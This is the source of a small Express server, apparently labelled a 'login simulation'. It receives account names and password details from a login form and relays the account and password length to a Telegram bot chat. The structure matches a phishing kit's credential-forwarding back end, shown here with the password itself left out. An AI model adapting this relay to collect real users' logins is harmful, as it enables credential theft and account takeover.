const express = require("express");
const dotenv = require("dotenv");
const cors = require("cors");

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

app.post("/simulation", async (req, res) => {
  const {
    account,
    passwordLength,
    maskedPassword
  } = req.body;

  if (!account || !passwordLength || !maskedPassword) {
    return res.status(400).json({
      success: false,
      error: "Simulation data is incomplete"
    });
  }

  const message =
`=== LOGIN SIMULATION ===
Account: ${account}
Password: ${passwordLength}`;

  try {
    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: process.env.CHAT_ID,
          text: message
        })
      }
    );

    if (!telegramResponse.ok) {
      throw new Error("Telegram request failed");
    }

    console.log("Simulation notification sent.");

    res.json({
      success: true
    });

  } catch (error) {
    console.error(error);

    res.status(500).json({
      success: false,
      error: "Telegram notification failed"
    });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
